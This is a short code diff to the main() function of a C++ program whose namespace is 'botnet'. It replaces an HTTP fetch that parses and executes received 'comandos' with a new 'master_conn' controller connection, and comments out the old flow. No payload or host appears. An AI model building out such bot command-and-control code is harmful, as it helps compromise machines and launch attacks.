@@ -4,12 +4,16 @@
 #include "parser.h"
 #include "utils.h"
 #include "define.h"
+#include "master_conn.h"
 
 int main() {
     typedef botnet::http::http_request http_request;
     typedef botnet::http::http_client http_client;
     typedef botnet::parser parser;
-    std::string cmds;
+    typedef botnet::master_conn master_conn;
+    master_conn *conn = new master_conn();
+
+   /* std::string cmds;
     parser *pcmd;
 
     std::cout << "Program name: " << botnet::my_name() << '\n';
@@ -30,7 +34,7 @@ int main() {
     cmds = cmds.substr(found +4);
     std::cout << "comandos:\n" << cmds;
     pcmd = new parser(cmds);
-    pcmd->execute();
+    pcmd->execute();*/
 
 	return 0;
 }
